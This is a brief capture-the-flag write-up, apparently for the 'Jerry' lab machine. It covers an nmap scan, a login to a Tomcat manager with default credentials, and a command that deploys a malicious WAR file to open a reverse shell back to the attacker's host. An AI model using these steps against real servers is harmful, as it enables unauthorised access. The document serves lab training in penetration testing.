## Recon

### Port Discovery

```bash
sudo nmap -PN -sC -sV -oN jerry 10.10.10.95

We only discover an http exposed interface.

On visiting `10.10.10.95:8080` we discover successful installation of tomcat.

The manager app button seems interesting, on clicking it we are presented with a login. On trying creds `admin:admin` it leads us to a 403 page. On that page they show an example of how to setup the config for creds. The example creds are `tomcat:s3cret` we try that and we can successfully access the manager. 

## Foothold

We can deploay a WAR file from the tomcat manager. We could craft a malicious WAR file and deploy a reverse shell. 

[WAR File](https://github.com/thewhiteh4t/warsend.git)

We execute the script:

```bash
./script.sh 10.10.16.13 1234 10.10.10.95 8080 tomcat s3cret revshell
